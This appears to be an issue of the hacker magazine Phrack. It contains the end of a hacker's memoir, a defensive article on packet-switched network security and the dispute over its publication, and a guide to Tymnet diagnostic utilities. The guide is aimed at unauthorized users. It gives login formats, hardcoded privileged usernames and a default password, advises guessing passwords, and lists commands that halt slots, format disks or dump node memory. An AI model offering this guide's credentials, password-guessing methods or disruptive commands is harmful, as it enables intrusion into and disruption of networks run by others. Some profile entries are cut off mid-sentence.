some computers.  And when you compare that to a piece of art, or a collection
of music, or a new series of programs that someone has created, you begin to
realize that all you're doing is fucking with things that other people made,
and you're wasting your time abusing . . .

     To cut short my rant, I have no moral judgements to pass upon anyone or
anything, because whatever it is that people do, it's some sort of learning
process leading towards their destination (whether they realize it or not).
The computer underground is just not a place where you can remain "active"
beyond a certain period of time that serves as a sort of "rite of passage"
towards that something else.  To hang around indefinitely and remain "active"
is to become a criminal.

     Almost everything I've done has taken place with a handful of friends who
played various roles in events that transpired -- primary among them Dead Lord
(Bruce Fancher), one of my closest friends for the better part of a decade, as
well as The Unspeakable One whose name cannot be mentioned for to do so causes
rifts within space/time, and a buncha dudes from NYC/NJ who for the most part
want to blip their personas off the face of Cyberspace and get on with their
lives without the specter of LaW EnForCEmEnT hanging over them for doing silly
things as teenagers.

     In 1986 I ceased calling anything and didn't access a computer that was
hooked into a modem until late 1990.  As of late 1992, I have been "retired"
for a little over 7 years.

Most Memorable Experiences
~~~~~~~~~~~~~~~~~~~~~~~~~~
     Most memorable things are unmentionable and destined to stay that way for
a while.  Those who played the games know the stories; those who didn't
eventually will -- but like, who cares.  Everybody should live their own
stories, life's an interesting game . . . go play.


Some People to Mention
~~~~~~~~~~~~~~~~~~~~~~
Dead Lord         - The one who is not and can never be, yet exists.  Solely an
                    infinite layering of the possibilities inherent within
                    personal transmigration and biotechnology?  Or alive, with
                    flesh, blood, bone and an adornment of k0dEz & warEZ?  You
                    must not be blinded by sight, nor fooled by what things
                    appear to be when they are not, for what is a man when he
                    has not the latest, nor possesses the abilities to acquire
                    same?  This is a question perhaps best left to the wise men
                    who roam the meadows of the ozone, forever catching the
                    edge and surfing the waves cresting upon the seas of
                    thought and what is, was, and shall always be.

The               - I know who you are, so tell me who I am, and let's just
   Unspeakable      get on with it okay?  Because otherwise, TV is likely to
              One   drop the entire facility dead.  Anyone of normal caliber
                    can see that to be entirely obvious to thee of the id'ness
                    of pole-cats watching Star Wars.  8+ KlUb ElYtE.

Terminus          - A good friend over many years who, as most people know, has
                    recently gone through a lot.  The future looks bright, and
                    I look forward to looking back on all this with you in
                    another ten years.  [Look, look, looking] (haga!)

Magnetic Surfer   - Neato guy who knew me way-back-when, and used to give me
                    gNu Apple wArEz on cassette tape which he had downloaded at
                    the lightning speed of 300 baud.  Also provided a means to
                    meeting many of my friends, via Sherwood Forest, when it
                    first existed and hosted Inner Circle and later KOS.

The Phantom      - See above, also gave me a full set of TAP copies in 1983,
                   which I never returned to him.

The Plague        - A cool guy, close friend before his fatal accident when
                    the truck went off the road near Poker Flats, just 5 miles
                    north of Pig's Knuckle, ID.  Tragic, hope he's happy in
                    his new home, far, far underground, running the world's
                    first afterlife/subterranean BBS.

Ninja NYC         - One of the few people I have ever met who seems to have
                    mastered the art of being happy wherever he is, doing
                    whatever he happens to be doing.  An exceptionally nice

Mr. Xerox         - Mike was usually witty, sarcastic, annoying, egotistical,
                    obnoxious, and almost always late.  We got along great
                    and I really miss the guy sometimes.  Hullo Mike, wherever

Lex Luthor        - After a ten year period during which we typed to each other

                    the m0dUm Yo0n!veRsE, I finally met with Lex in the very
                    near past.  It's shocking to find that he's actually one of
                    the most gracious, funny, and pleasant guys I've ever had
                    an opportunity to meet.  Best wishes in whatever you may

             Volume Four, Issue Forty-Two, File 4 of 14

                          Prelude to a Kiss

    - Lessons Unlearned Are Doomed To Bring Misery Ad-Infinitum -


The following is an article I wrote for a mainstream computer security
periodical called ISPNews.  At the time, I had been discussing the idea
of a bi-monthly column with the editor at that time, Len Spitz. (Now the
editor is Michael Alexander, ex-of Computerworld)

The following article, although very, very tame by my standards, and
admittedly lacking in enough hardcore information to help security
professionals to apply a quick fix to their many problems, caused quite
a stir among the folks at ISPNews.

Since this article was from me, a self-proclaimed hacker, it
underwent an extraordinary amount of scrutiny.  Rather than be
accepted or denied by the editor, my article got the dubious honor of
being sent before an editorial advisory board.  I checked every back
issue of ISPNews and could find no mention of such an entity until the
November/December 1991 issue, the issue immediately following an length
interview with none other than myself.

When I questioned Len Spitz about this rather odd fact, he maintained
that this committee had indeed existed, but stammered his way through my
question to name any other article that they had convened to judge in
the past, and to explain the duties of such a group.  He could not give
me any answers.

The group itself was obviously geared to be a type of kangaroo-court.
It consisted of:

William J. Cook -- The man who less than two years prior had ordered my
                   privacy and civil rights violated by the Secret
                   Service solely on the basis of two bulletin board
                   posts and my association with members of the Legion
                   of Doom and the Phrack Magazine staff.

William H. Murray -- A senior consultant with Deloitte & Touche who had
                     two weeks prior stood up before my presentation to
                     the MIS Training Institute's 11th Annual Conference
                     and said loudly "I can't take this any more, I'm leaving,"
                     to the astounded audience.  The man who went on to
                     state in his own column in ISPNews, "Can we lie
                     down with dogs and get up without fleas?"  and "Ask
                     yourself if you wish to work in a profession
                     populated by rogues.  Ask yourself if you want your
                     reputation mixed with theirs."

Winn Schwartau -- A security consultant with a broad view and an open
                  mind, undoubtedly resulting from his background in the
                  music industry, as opposed to the bean-counting world
                  of MIS.

David J. Stang -- Director of research, NCSA.  Noted virus specialist.

This was the group.  Here is what they said about my article:

Bill Cook --  "It's very well-written and informative, but shouldn't be
published for legal reasons."  (What those reasons might have been were
not stated, nor did Mr. Cook return my call to his office.)

Bill Murray -- Was not even given the file to read, as his response was
deemed to predictable.

Winn Schwartau -- "Publish it.  This is valuable information."

David Stang -- Was not given the file because, according to Len Spitz
"David is just a virus expert, and this isn't in his arena, so we gave
it to Ray Kaplan."

    Ray Kaplan -- Did not want to comment on it because he said, "It's
    not my expertise, so I gave it to a friend."  I believe Ray did not
    want to get involved with anything having to do with hackers after
    the reactionary attitudes of the DECUS attendees towards his defense
    of Kevin Mitnik that nearly left him in bankruptcy.  I cannot blame
    him at all.  (Hell, I like the guy...he's certainly more brazen with
    attitude these days, I mean, he went to HoHoCon for God's-sake!)

      Ray's Friend -- "This is of absolutely no use to the information
      security professional, but of great use to the hacker community."
      I still do not know who Ray's "friend" was.  I hope his
      Alzeheimer's has subsided since this comment.

Needless to say, the article went unpublished.

Shortly thereafter I received a letter from Robert Fox, an assistant
vice-president at Sprint.  Somehow my little article had snaked its
way over to Kansas City.  It's amazing how one faxed copy of an article
could have reached so many people in such a short period of time.
Mr. Fox had the following to say:

Dear Mr. Goggans:

    A copy of the referenced unpublished article, which is
enclosed with this letter, has come to our attention.  After
review, we believe the article is inaccurate and libelous.  If
published the contents of the article could cause damage to Sprint
customers, Sprint and our reputation, and we request that you not
publish or otherwise disseminate it.

     In addition, we believe some of the information contained in
the article has been obtained through violation of the property
rights of Sprint and/or our customers and we demand that you cease
any efforts or attempts to violate or otherwise compromise our
property whether or not for you personal financial gain.

                        Sincerely,

                        Robert F. Fox


Enclosure


------------------------------------------------------------------------


Regardless of how Mr. Fox came into possession of this article, i have to
question his letter based on his comments.   First he states that
the information is almost criminally incorrect and could cause harm to
Sprint's reputation.  Then he states that information in the article has
come to be known through the violation of the security of Sprintnet and/or
clients of Sprintnet.  In effect, I am both a thief and a liar according
to Mr. Fox.  Well, if I were a thief the information could not possibly
be inaccurate if it were obtained from Sprintnet or its clients.  If I
was a liar, why would they think the information came from themselves
and/or their clients?  Mr. Fox's thinly veiled threat caused me great
amusement.

I then decided no mainstream publication would touch this article.  I
don't know why everyone is so scared of the truth.  Perhaps if the truth
were known people would have to work, and perhaps if the truth were
known some people would be out of work.  None of this is of concern to
me anymore.  I am here to speak the truth and to provide uncensored
information gathered from a variety of sources to provide readers of
this magazine the facts they need to quench their thirst for knowledge.

This article is included as a prelude to a series of articles all based
on packet switched networks as related to information merely alluded to
in my harmless little article.  To our readers, "enjoy."  To the cowering
so-called security experts, "kiss my ass."

------------------------------------------------------------------------

Packet-switched Networks

Security Begins with Configuration


For many companies the use of packet-switched networks has
allowed for increased interconnectivity of systems and easy
remote access.  Connection to a major public packet-switched
network brings increased access points with local dialups in
many cities around the nation as well as access
points from foreign countries.

With the many obvious benefits provided by this service,
improper configuration of either the host's connection to the
network or of the network itself can lead to extreme security
problems.

The very connection to a public packet-switched network
immediately increases the exposure of that particular system.
America's two major commercial networks, BT-Tymnet and
Sprintnet, are probably the most popular US targets for hackers
around the world.  The wealth of systems available on
these two networks has provided hackers with a seemly endless
supply of sites on which to sharpen their skills.  The ease of use
inherent in both networks makes them popular for legitimate
users as well as illegitimate users.

The Telenet software utilized in the Sprintnet network allows
users to enter a network user address (NUA) in the standard
format as outlined in the X.121 numbering standard:

DDDDAAAHHHHHPP

Where D = the four digit data network identifier code (DNIC)
      A = the three digit area code corresponding to the host
      H = the host address
      P = the port or (sub) address

On domestic calls the DNIC for Sprintnet (3110) is stored in
all Sprintnet equipment and is used as the default.  By
merely picking an area code, most often corresponding to the standard
area codes of the North American Numbering Plan, and an
additional one to five digits a would-be intruder can
connect to any number of systems while looking for targets.

In the past many software packages have been written to
automate this process, and large scans of the network have
been published in a variety of underground media.

The Tymnet II software utilized in BT's Tymnet
prompts the user for a mnemonic which corresponds to a host
or number of hosts.  The mnemonic, or username, is referenced
to a fixed host address in the network's Master User
Directory (MUD).  This username may allow the caller to
connect to a variety of sites, as opposed to merely one, by
entering additional information in separate fields after the username.
It may also correspond to a network gateway thereby allowing
the user to enter a number in the X.121 format and connect to that
specific site.

This particular network, with its primary use of words as
opposed to numbers, has been compromised by intruders who
guess common words or names in their attempts to connect to
remote sites.

Each network has its own particular set of problems but
solutions to these problems are both simple and quick in
implementation.

SPRINTNET

The first deterrence in securing a host on this
network is to restrict access to the site.  This can be
accomplished in a number of ways.  The most obvious is to
have the site refuse collect calls.  All calls on Sprintnet
are reverse-billed, unless the site has specifically asked
that they not be billed for incoming calls.  This makes the
site accessible only through the use of a Network User
Identifier (NUI).

Another method of restricting access from intruders is to
place the host in a closed user group (CUG).  By electing to
have the host in a CUG, the administrator can allow only
certain NUIs to connect, and can also restrict the actual
addresses from which access is allowed.  For example:  A site
is placed in a CUG that will allow only calls from the
company's remote branch in Dallas to access the host and only
with the NUI created specifically for that branch.  All
attempts to access the site from an address outside the 214
area will result in an error message indicating an invalid
source address.  All attempts to connect with an invalid NUI
will result in an error indicating an invalid ID.  This
information is maintained in the networks main TAMS (TP
Access Management System) database, and is not subject to
manipulation under normal circumstances.

Many sites on the Sprintnet network have specific
subaddresses connecting to a debug port.  This is usually at
subaddress 99.  All connections to debug ports should be
restricted.  Allowing users access to this port will allow
them the ability to load and display memory registers of the
Sprintnet equipment connected to the port, and even reset
as well as enable or disable the host.  Most debug ports are
equipped with preset passwords from the vendor, but should be
changed.  These ports should also restrict connection from
all addresses except those specified by the company.

An additional measure that may foil intruders relying on
software programs to find all addresses in a given area code
is to request that the host be given an address above 10000.
The time involved in scanning the network is extensive and
most casual intruders will not look past the 10000 range.  In
fact, many will not venture past 2000.

BT-TYMNET

Any company having a host on the Tymnet network should choose
a username that is not easily associated with the company or
one that is not a common word or name.  If an intruder is aware that
XYZ Inc. has a UNIX based system on TYMNET he or she would
begin attempts to find this system with the obvious
usernames:  XYZ, XYZINC, XYZNET, XYZ1, XYZUNIX, UNIX, etc.

BT-Tymnet allows for these usernames to have additional
password security as well.  All hosts should have this option
enabled, and passwords should be changed frequently.
The password should always be a minimum of six
digits, should include letters, numbers and at least one symbol
character, and should not be associated in any way with the
corresponding username.

Many clients of BT-Tymnet have purchased the Tymnet II
software and have individual sub-networks that are linked to
the public network through gateways.  Each subnet is
personally configured and maintained through the use of a
package of utilities provided by Tymnet.  These utilities
each perform a specific task and are highly important to the
smooth operation of the network.  These utilities may be
accessed either directly from the host-end or remotely
through the network by entering a corresponding username.
Some of these utilities are:

XRAY : a monitoring utility
DDT : a debugging utility
NETVAL : a database of username to host correspondence
PROBE : a monitoring utility
TMCS : a monitoring utility

Under NO CIRCUMSTANCES should these utilities be left
without a password on the company's subnet.  These utilities should
also never be named similarly to their given name.  Should an
intruder gain access to any of these utilities the integrity
of your network will be at risk.

For example:

Allowing an outsider access to the XRAY utility, would give
he or she the ability to monitor both incoming and outgoing
data from the host using the "TA" command (display trace data
table in ASCII).  Use of certain XRAY commands are restricted
by a security function that allows only certain usernames to
execute commands on the basis of their existence in a
"Goodguy" list, which can be displayed by any XRAY user.
Should a user be of the highest privilege, (2), he or she can
add or delete from the "Goodguy" list, reset connections, and
display trace data on channels other than the default
channel.

Allowing a user access to DDT can result in complete
disruption of the network.  DDT allows the user the ability
to write directly to the network controller "node code" and
alter its configuration.

Allowing a user access to NETVAL will allow the user to
display all usernames active on the network and the
corresponding host addresses.

OTHER PROBLEMS

EXAMPLE ONE

On many networks users have the ability to connect to the
packet assembler/disassembler (PAD) of the network dial-ups.
This has led to significant problems in the past.

In the mid-1980's two American hackers were exploring the
German packet network DATEX-P.  One connected to a host in
Berlin and was immediately disconnected by the remote site.
Before the hacker could react, the German host connected to
the NUA corresponding to his Sprintnet PAD and sent him a
login prompt.  This alarmed the hacker greatly, as he assumed
that the proprietors of the German host had somehow noticed
his attempt to access their system.  He contacted his partner
and told him of the occurrence.  The two concluded that since
the NUA of the origination point is sent in the packet-header,
the remote site must have been programed to recognize the NUA and
then return the call.  The fact that it had returned a call to a
public PAD was intriguing to the pair, so they decided to
attempt to recreate the event by calling each other.  Both
individuals connected to the network and one entered the NUA
corresponding to the others PAD.  A connection resulted and
the two were able to interact with one another.  They then
decided that they would periodically meet in this fashion and
discuss their findings from Germany.  At the time of the next
meeting, the connection did not occur as planned.  One hacker
quickly received a telephone call from the second who
exclaimed rather excitedly that he had attempted to connect
to his partner as planned, but accidentally connected to
another PAD and intercepted a legitimate user typing his NUI.
Further investigation proved that one could connect to public
PADs during the idle period when the user was in network
mode, prior to making a connection to a remote site.  This
discovery was intended to remain secret, because of its
extremely dangerous applications.  Nevertheless, word of this
discovery soon reached the entire hacker community and what
came to be known as "PAD to PAD" was born.

The "PAD to PAD" technique became so wide-spread that hackers
were soon writing software to intercept data and emulate
hosts and capture login names and passwords from unsuspecting
network users.  Hackers were intercepting thousands of calls
every day from users connecting to systems ranging from
banking and credit to the Fortune 500 to government sites.

After nearly two years of "PAD to PAD" Sprintnet became
alerted to the crisis and disallowed all connections to
public PADs.  When Sprintnet expanded its service overseas
they once again left access to the overseas PADs
unrestricted.  The problem went unnoticed again until
their attention was brought to it by a hacker who called
Sprintnet security and told them that they ought to fix it
quickly before it became as wide-spread as before.
The problem was resolved much quicker this time.

This particular technique was not limited to Sprintnet.  All
networks using the Telenet software are at risk to this type
of manipulation.  This type of network manipulation was
integral in the recent compromise of a large Bell Company's packet
network in a much-publicized case.  Certain foreign
networks in countries such as Israel, England, Chile, Panama,
Peru and Brazil are also at risk.

EXAMPLE TWO

In the late 1980's hackers stumbled onto a packet network
owned and maintained by a large facilities maintenance
company.  This particular network had a huge flaw in its
setup.  It connected all calls placed through it as if they
were placed with an NUI.  This allowed hackers to place calls
to addresses that refused collect connections on networks
around the world.  This became a popular method for hackers
to access underground chat systems in Europe.  Additionally,
this network contained a score of computers belonging to a
major automobile manufacturer.  Most of these systems were
highly insecure.  The network also allowed unrestricted
access to network debug ports.  This particular network also
had a toll-free number on an MCI exchange.  At the time, MCI
was having some difficulty getting their equipment to accept
the ANI information to provide customers with a full call-
detail report on their monthly statement.  The hackers were
well aware of this fact and made frequent use of the network
with no fear of prosecution.  Eventually MCI was able to fix
their translation problem and were able to provide their
clients with full call-detail reports.  When this was
learned, many hackers abandoned use of the network, but
several others were later prosecuted for its usage when their
number turned up on the bill.

EXAMPLE THREE

Until quite recently intimate knowledge of the utilities
driving various packet-switched networks were known by an
exclusive few.  While investigating a network owned by an
extremely large Cleveland-based conglomerate hackers came
across a system where documentation on the usage of every
utility was kept online.  The hackers quickly downloaded all
the information and it soon became somewhat wide-spread among
the underground community.  With less-skilled and more
unscrupulous individuals in possession of this information
many networks began experiencing disruptions and system
integrity was quickly lost as hackers began monitoring data
traffic.

No information on the usage of packet networks or their
utilities should ever be kept online.  Hard copies should be
kept in the possession of the network administrator, and when
updated, obsolete versions must be destroyed.

WHAT TO DO

When a security violation stemming from a connection through
the packet network is noticed, Network Security should be
notified.  Clients of BT-Tymnet should notify Steve Matthews
at 408-922-7384.  Clients of Sprintnet should notify
Pat Sisson at 703-689-6913.

Once changes have been enacted in the network to prevent
further break-ins, the host computer should be checked
thoroughly for any changes or damages, and all individual
account passwords should be changed.

CONCLUSION

It is critical that the packet network be configured properly
and that all measures are taken to ensure its security.  Even
the most secure host computer can be easily compromised if it
is connected to an insecure packet network.

   While the scope of this article is general, the information contained
within is NOT for the novice Tymnet explorer.  Novice or NOT, go ahead
and read; however, caution should be taken when invoking any of these
commands upon BT's network.  Execution of certain commands can have
debilitating consequences upon segments of the network.

   In this article I intend to educate the reader about the various
Tymnet diagnostic utilities that are available.  This article is by no
means an in depth microscopic view of the utilities; but rather a brief to
the point survey course of what is available to qualified people.  With
each utility I will describe its use/s, list its major commands, and
in DDT & XRAY's case, dispense its hard-coded usernames which allow you to
become a 'qualified person.'

   It seems the software engineers at Tymnet (for the lack of something
better to do) like to rename ordinary words to complicated ones.  For
instance, within this article I will talk about LICENSE LEVELS.  License
levels are nothing more than security levels.  When I speak of License
Level 4, just translate that to Security Level 4.  I would have just called
everything security levels, but I wanted to stay within that lethargic
Tymnet mood for realism purposes.  Another word the engineers pirated from
'GI JOE' was GOOD-GUYS.  In our world, a Good-Guy is a valid username that
can be used for logging into the various diagnostic utilities.

   Like most conventional computers, Tymnet also needs an operating system
for its code to run under.  Tymnet's node-level, *multitasking*, operating
system is called ISIS; it stands for 'Internally Switched Interface System.'
Its designed for: handling multiple communication links, allocating system
memory, system job/process scheduling, and all the other BASIC things ALL
operating systems do.  Tymnet explains it a bit more complicated and less
to the point, but to give equal time to the opposing viewpoint, this is
what they say:

   "Internally Switched Interface System. The operating system for a TYMNET
    node; provides functions that control the overall operation of an
    Engine.  These functions include, but are not limited to, memory
    allocation, message switching, job scheduling, interrupt processing,
    and I/O distribution. ISIS allows multiple data communications
    functions to run on a single processor.  Two of its many services are
    debugging and I/O port management. Formerly known as ISIS-II or ISIS2.
    ISIS2, ISIS-II  Obsolete terms. See Internally Switched Interface
    System (ISIS)."

   At various points within this file I will refer to an ENGINE.
Basically, an ENGINE is a minicomputer which handles all the processing
requirements that ISIS and its applications demand.  However, to be fair to
all the Tymnet technoids, this is what BT says:

   "BT North America packet-handling hardware. The Engine communications
    processor is a member of a family of special-purpose minicomputers.
    It runs communications software such as Node Code (for switching),
    slot code (for protocol conversion and value-added functions), and
    the ISIS operating system. The Engine family consists of the
    Pico-Engine, Micro-Engine, Mini-Engine, Mini-Engine-XL,
    Dual-Mini-Engine-XL, Engine, and ATC."

   You think they would have invented much NEATER names for their computer
platforms than 'Mini-Engine' or 'Micro-Engine'.  I would guess that BT's
hardware engineers have less time than the software engineers to invent
K-RAD names for their projects.  Anyhow, as you can see, the ENGINE is the
muscle behind Tymnet's network brawn.

   Another term which is very basic to ANY understanding of Tymnet is the
'SUPERVISOR.'  As you can see the engineers searched high & low for this
clever term.  The Supervisor is many things including, the authentication
kernel you interact with, the circuit billing system that subscribers
unfortunately do not interact with, and generally the network's 'BIG BROTHER.'
Supervisor watches the status of the network at all times, keeping detailed
logs and interceding when trouble erupts.  The supervisor term can also
refer to the engine upon which the Supervisor is being run on.

   With all that in mind, I will now introduce five of Tymnet's diagnostic
tools.  I intend on presenting them in this order: DDT, MUX, PROBE, LOAD-II,
TOM, and XRAY.  Please note that only DDT and XRAY have 'good-guy' lists
provided.

DDT - Dynamic Debugging Tool
----------------------------

   DDT is a utility which runs under the ISIS operating system.  DDT is
capable of loading or displaying a slot's content.  A slot is an area of
memory in a node in which Tymnet applications run.  DDT can also be used
for modification of a specific slot's slot code.  Slot code is any
program which has been assigned memory within the engine by ISIS.  DDT also
performs other lower level diagnostic functions, which I will not go into.

   Logging into DDT requires you to provide the 'please log in:' prompt
a valid username and password.  Upon checking the good-guy list and
authenticating the user, the kernel process searches for the associated
slot assignment.  If no slot is assigned to the good-guy, the kernel will
prompt you for a slot number.  Once you enter a VALID slot number and it is
available, the authentication kernel executes the DDT utility.  When I say
'VALID' slot number, I mean a slot number which logically exists AND is
attainable by your current good-guy's license level.

   Actual logins to DDT take the form:

   please log in: goodguyID:host# <cr>
        password:

Where goodguyID is a valid goodguy, host# is the Tymnet subscriber who
needs a little 'work' done, and obviously the password is what it is.  While
I would like to give you all the passwords I could, I don't think it is
going to happen.  So all I can do is suggest trying different variations
of the goodguy IDs, and other dumb passwords unsecure people use.

   Connection to primary DDT is displayed as the ever-so-friendly '*' prompt.
It is from this prompt that all general DDT commands are directed.  The most
useful DDT commands are listed below in a general, extended, and RJE/3270T
specific registry.


GENERAL DDT COMMANDS
--------------------

E            Execute a slot.
H            Halt a slot. <---- DESTRUCTIVE See WARNING!
ZZ           Logs you out of DDT.
^#           Transfers control from the current slot to the slot
             specified by #. (IE- ^7  Switches control to slot 7)
?CPU         Displays CPU utilization (Engine Performance)
?HIST        Displays a history of diagnostic messages.
?HOST        Displays the hosts in use by that slot.
?LU          Displays the logical unit to physical device assignment.
?MEM         Displays the time of memory errors if any.
?STAT        Allows the execution of EXTENDED DDT.  To obtain the extended
             command prompt type '/'.Command prompt ':>'
?VERN        Displays the ISIS version followed by the SLOT's version.


WARNING!: It is possible to HALT a slot accidently.  This will freeze
          everything going in/out of the current slot.  This can be BAD
          for customer satisfaction reasons.  If you accidently hit 'H',
          even without a CR/LF it will hang the slot.  So when the ?HIST or
          ?HOST commands are used make SURE you type that important '?'
          beforehand.  This will halt everything going over that slot,
          effectively destroying the communication link.


EXTENDED COMMANDS FOR RJE & 3270T
---------------------------------

RJE & 3270T
===========
EXI          Logs you out. (DuH!)
QUIT         Return from extended DDT prompt ':>' to normal '*' DDT prompt.

RJE Only
========
HELP         Displays a list of commands available in extended RJE DDT mode.
             (A list not worth putting in here.)
SCOPE        Outputs a protocol trace.
TRACE        Outputs a state trace.

3270T Only
==========
HELP         Displays a list of commands available in extended 3270T DDT mode.
             (Again, a list not worth putting in here.)

     be shown the incredible "ILLEGAL COMMAND" string.


GOOD-GUYS AND LICENSE LEVELS
----------------------------

   As with any username, there is an accompanying license level (security
level) with each account.  The different levels define which types of
slots that username may access and the available commands.  Some of the
good-guys have access to all slots including supervisor, while others
have access to only non-supervisor slots.

   The table below is a list of the actions that are available with the
various different license levels.

L.DISC    Permits disk formatting
L.H       Permits the halting, loading, and restarting of all slots for
          code-loading purposes.
L.P       Permits the halting, restarting, and online software modification
          to an active slot. (Except slots 0 and FF)
L.R       Permits logon to all slots (Except 0 and FF)
L.SOA     Permits logon to a node's slot 0. (Node configuration.)
L.SOP     Permits the halting, restarting, and online software modification
          to slot 0.
L.SOR     Permits the reading of slot 0 files.
L.SUA     Permits logon to Supervisor slots.
L.SYA     Permits logon to a node's FF slot. (ISIS configuration node.)
L.SYR     Permits the reading of slot FF files.
L.SYP     Permits the halting, restarting, and online modification to
          slot FF.

   The DDT license levels are numbered from 0 to 4, 4 being Gh0D.  Each level
has several of the above named actions available to them.  Listed below are
the various actions available at the 0 through 4 license levels.

LEVEL   ACTIONS
=====   =======
  4     L.DISC, L.P, L.SOA, L.SOP, L.SUA, L.SYA, and L.SYP .
        (Disk format, halt, restart, online software mods, and reading
         of files for all slots AND supervisors. Like I said, GOD.)

  3     L.P, L.SOA, L.SOP, L.SYA, and L.SYP .
        (Halt, restart, online software mods, and reading of files for
         all slots and supervisors.)

  2     L.H, L.R, L.SOA, L.SOR (For code loading purposes: halt, restart
        online software mods, and reading files for all slots and
        supervisor nodes.)

  1     L.R, L.SOA, L.SYA (Views ALL slots and supervisor nodes)

  0     L.R (Views all slots, EXCEPT supervisor slots and 0 & FF.)

   What follows is a good-guy userlist with the associated license level
of that username.  I also note whether the account is ACTIVE/PASSIVE upon
an operating node/slot combination and the seriousness of the network
impact that those associated licenses can possibly create.

MUX - The Circuit Multiplexer
-----------------------------

   MUX is a tool which also runs within an ISIS slot.  MUX allows the
building, interconnecting, and controlling of several sets of circuits from
a single terminal.  Instead of logging in and out of each diagnostic
tool as different commands are needed, MUX is used to create multiple
concurrent circuits.  Once these are set up, it is easy to switch back
and forth between different diagnostic applications, WITHOUT having to
logoff one before logging into another.  Tymnet also likes to boast that
you can chat with other users on MUX's 'Talk mode facility.'  I'll stick
to IRC until this catches on.

   Logging into MUX is quite simple.  It takes the form of:

   please log in: userid <cr>
        password:

NOTE: ATTN commands, see CHAR command.
ATTN ATTN       Allows you to send one attention character down the circuit.
ATTN C x        Labels the current port, where 'x' is the label you desire.
ATTN E          Allows you to switch to the next port you have defined.
                This command however is not valid from the command mode.
                The circuit label is presented and connection is made.
                Even though the prompt for that circuit is not presented,
                you ARE connected.
ATTN Z          Returns you to the command mode.

CHAR char       Configures your ATTN character to 'char'.  So in the below
                ATTN commands, you will have to enter your ATTN character
                then the proceeding character.  The default ATTN Character
                is CTRL-B.  Personally, I like to set mine to '!'.
CONNECT pl1,pl2 Connect the output of port label-1 to port label-2.
                Usually your current port label is marked with a * preceding
                it in a 'LIST', this is also known as a BOSS.

ENABLE pl       Enables a pl's (port labels) output.
EXIT            Leave MUX with all your circuits INTACT.

FLUSH pl        Flush pl's (port labels) output.
FREEZE N/F      Freeze (N=ON or F=OFF) current Boss.

GREETING msg    Sets up the greeting message.

HEAR N/F        Allow (N=ON or F=OFF) users to 'TALK' to each other.
HELP            Prints help messages. (ooof)

LIST            Lists all active ports for the current user. (ATTN Z L)
LABEL N/F       Labeling (N=ON or F=OFF) of all output sent to the Boss.

MAKE            Make a new circuit by logging onto a diagnostic tool.
                You will be prompted with the omnipresent 'Please log in:'
                prompt.  Just login as usual for particular tool.
MESSAGE         Print last message.

QUIT            Leave MUX and ZAP all circuits created.

SEND pl         Send to pl (port label).

TALK username   Talks to 'username' providing HEAR=N.
TIME            Outputs date and time in format: 31Dec93 05:24
TRANSFER pl     Transfers control of this BOSS to pl (port label).

ZAP pl          Zap any circuits you made, where 'pl' is the port label.
                This command defaults to the port labeled '*' (Boss).
                This command is ONLY valid in command mode.

PROBE
-----

   PROBE is probably one of the BEST known Tymnet diagnostic tools.
PROBE is actually a sub-program of the Supervisor.  PROBE is capable of
monitoring the network, and it has access to current pictures of
network topology, including host tables and node descriptors.  PROBE
shares common memory with the Supervisor and has circuit tracing
capability.  PROBE can be used to check the history of nodes & links,
boot a node, trace a circuit, and reset a link or shut one down.
PROBE can be access directly or through TMCS (Tymnet Monitoring
and Control System.)

   To access PROBE from within TMCS you would enter the command:

PROBE s    Where 's' is the active or 'sleeping' supervisor.

For more PROBE related TMCS commands or general TMCS commands, please
refer to an appropriate source.  If the demand is great enough, perhaps I
will release a TMCS reference sheet in the future.

   PROBE access is determined by the sum of the individual license
levels granted to the user.  PROBE licenses are as follows:

License    Description
-------    -----------
  00       Permits view only commands -- user is automatically logged off
           from PROBE after 20 minutes of no activity.
  04       Permits view only commands -- no automatic logoff.
  20       Permits all 00 commands plus ability to effect changes to
           network links.
  10       Permits ability to effect changes to node status.
  01       Permits ability to effect changes to network supervisors.
  02       Permits ability to effect changes to supervisor disks.

   I do not have any hardcoded usernames for PROBE with this exception.
The PROBE access username 'PROBE' is hardcoded into the supervisor,
and usually each host has one hardcoded PROBE username: CONTROL -- license
level 37.  So in comparison with the above chart, CONTROL has Gh0d access
to PROBE commands, because everything added up equals 37 (duh).  On many
subnets, the username RPROBE has similar access.

DCREAD           02     Reads current value of password cipher associated
                        with DCENT username.
FTIME +/- s      02     Corrects the 'Super Clock' by adding (+) or
                        subtracting (-) 's' seconds from it.
INITA            02     Initializes accounting file to all zeros.
INITL            02     Initializes log to all zeros.


NOTE:  Each PROBE is a separate entity with its own files.  For example,
       if you shut lines in the PROBE on the active Supervisor, this will
       NOT be known to the sleeping PROBE.  If another Supervisor takes
       over the network, it will not consider the link to be shut.
       Likewise, PROBE password changes are made only to one PROBE at a
       time.  To change your password everywhere, you must do a CHANGE in
       each probe.

LOAD-II
-------

   LOAD-II is probably one of the LEAST known of Tymnet's utilities.
LOAD-II is used to load or dump a binary image of executable code for a
node or slot.  The load/dump operation can be used for the ENTIRE engine,
or a specific slot.

Upon reaching the command prompt you should enter:

   R LOADII <cr>

This will initiate an interactive session between you and the LOAD-II
load/dumping process.  The system will go through the following procedure:

TYMNET OUTPUT         YOUR INPUT  WHAT THIS MEANS TO YOU
-------------         ----------  ----------------------

Enter Function:           G       'G' Simply means identify a gateway
Enter Gateway Host:     ####      This is the 4 digit identifier for hosts
                                  on the network.  I know that 2999 is for
                                  'MIAMI'.
Password:               LOAD      This is the default password for LOAD-II.
Function:                 C       'C' for crash table dump, OR
                          D       'D' to dump an entire engines contents, OR
                          L       'L' to load an entire engines contents, OR
                          S       'S' to load a slot, or
                          U       'U' to dump a slot.

                                  first two digits of the node number and
                                  appending the last two digits to that sum.
Line # to Load From:    ##        Use the line number coming off the
                                  neighbor node, NOT the node that is DOWN.

EXIT                    EXI       Send program to end of job.


TOM - TYMCOM Operations Manager
-------------------------------

   TOM is utility which runs under TYMCOM.  Quickly, TYMCOM is an interface
program for the host computer which imitates multiple terminals.  Quoting
from Tymnet, "TYMCOM has multiple async lines running to the
front-end processor of the host."  So in other words, TYMCOM has a
bunch of lines tied into the engine's front-end, allowing a boatload of
jobs/users to access it.

   TOM is primarily used with TYMCOM dialup ports.  It is used to DOWN and
then UP hung ports.  This type of situation may occur after a host crash
where users are getting a 'Host Not Available' error message.  TOM can also
be used to put messages on TYMCOM in order to alert users to problems or
when scheduled maintenance will occur on various hosts/ports.  To login
type:

   ##TOM##:xxxx

Where 'xxxx' is the appropriate host number you wish to 'work' on. After
proper hostname is given, you will then be prompted for a password.  As I
have none of these to give, play on 3-5 character combinations of the
words: TYMCOM, TOM, HIF, OPMNGR.

